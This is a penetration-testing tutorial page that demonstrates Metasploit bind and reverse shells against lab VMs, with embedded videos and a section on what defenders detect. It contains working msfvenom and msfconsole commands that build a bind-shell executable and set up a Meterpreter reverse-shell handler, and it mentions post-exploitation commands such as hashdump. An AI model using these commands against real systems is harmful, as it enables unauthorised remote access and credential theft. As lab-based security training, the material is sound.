---
title: Metasploit Video Examples
description: Watch bind and reverse shells demonstrated with the Metasploit Framework, and learn how msfvenom payloads, listeners, and Meterpreter fit together.
layout: ../../layouts/MainLayout.astro
---

Reading about [Metasploit](/en/page-6) is one thing; watching a payload land and drop you into a live shell makes the whole workflow click. The two recorded demos below walk through gaining command-line access to remote machines in a lab. Run these only against systems you own or have written permission to test.


<figure class="hh-video">
  <video controls preload="none" playsinline poster="/en/images/metasploit-walkthrough-poster.png">
    <source src="/en/videos/metasploit-walkthrough.webm" type="video/webm" />
    <source src="/en/videos/metasploit-walkthrough.mp4" type="video/mp4" />
    Your browser does not support embedded video.
  </video>
  <figcaption>A full exploit-to-shell run against a Metasploitable lab VM using Metasploit.</figcaption>
</figure>

## Bind Shell vs. Reverse Shell

Both demos end with the attacker controlling a shell on the target, but the connection is set up in opposite directions. Knowing which is which explains why one reliably works through a network perimeter and the other usually does not.

- **Bind shell:** The payload on the target opens a listening port and binds a command interpreter to it. The attacker then connects _inward_ to that port. Inbound connections from the internet are exactly what a perimeter [firewall](/en/page-firewall) is built to block, so bind shells mostly survive on flat lab networks or the [localhost](/en/page-localhost).
- **Reverse shell:** The attacker runs the listener; the target reaches _back out_ to it. Because most networks freely permit outbound traffic, the callback slips past filtering that would have dropped an inbound bind. This is why reverse shells are the default in real engagements.

The payload does the connecting; the Metasploit module `exploit/multi/handler` (or a matching exploit's built-in handler) does the catching. Match the two exactly: the `LHOST`/`LPORT` you set when generating a reverse payload must equal the handler's `LHOST`/`LPORT`, or the session never forms.


<figure class="hh-figure">
  <img src="/en/diagrams/reverse-vs-bind-shell.svg" alt="The difference between the bind and reverse shells shown in the videos." loading="lazy" />
  <figcaption>The difference between the bind and reverse shells shown in the videos.</figcaption>
</figure>

## Example 1: Bind Shell on a Windows Machine

Here a standalone payload is built with `msfvenom`, delivered to the Windows target, and caught with a handler in `msfconsole`. The payload opens a port on the victim; the attacker connects to it and gets an interactive command line.

```bash
# Build a Windows bind-shell payload (target opens the port)
msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 \
  -f exe -o payload.exe

# In msfconsole, connect the handler to the target's open port
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/shell_bind_tcp
msf6 exploit(multi/handler) > set RHOST 10.0.0.20
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run
```

<video controls style="max-width: 100%; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
  <source src="/en/videos/bind-shell-windows.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>

## Example 2: Reverse Shell on Metasploitable

This demo targets Metasploitable, the deliberately vulnerable Linux VM from our [Metasploitable setup guide](/en/page-metasploitable). Instead of a hand-delivered file, a built-in exploit module abuses a known service flaw and instructs the target to connect back to the attacker's Kali box, landing a reverse session.

```bash
# A reverse payload calls back to the attacker's listener
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD linux/x64/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.0.0.5   # attacker IP
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run
```

<video controls style="max-width: 100%; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
  <source src="/en/videos/reverse-shell-metasploitable.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>

Prefer a `meterpreter` payload over a plain `shell` when the platform supports it. Meterpreter runs in memory, gives you structured commands (`getuid`, `sysinfo`, `hashdump`, `download`), and lets you background the session and pivot without spawning noisy child processes.

## Reproduce It in Your Own Lab

Nothing here should touch a network you do not control. Build an isolated environment first: spin up attacker and victim [virtual machines](/en/page-3) on a host-only network so no traffic can escape.

1. **Enumerate.** Point [Nmap](/en/page-4) at the target to find open ports and service versions before choosing a module.
2. **Select a module.** In `msfconsole`, use `search` to match a service to an exploit, then `use` it and review `options`.
3. **Set target and payload.** Fill in `RHOSTS`, plus `LHOST`/`LPORT` for reverse payloads.
4. **Run and interact.** Launch with `run`; on success, `sessions -i` drops you into the shell.

## What Defenders See

Every step in these videos leaves signals a blue team can catch. Bind shells announce themselves as an unexpected listening port; a quick `netstat -ano` or `ss -tlnp` on the host surfaces it. Reverse shells generate outbound connections to an unfamiliar address, which egress filtering and network monitoring flag. Endpoint detection tools also fingerprint the default `msfvenom` templates and Meterpreter's in-memory behaviour. Understanding the offensive workflow is precisely what makes those detections meaningful during [incident response](/en/page-incident-response).
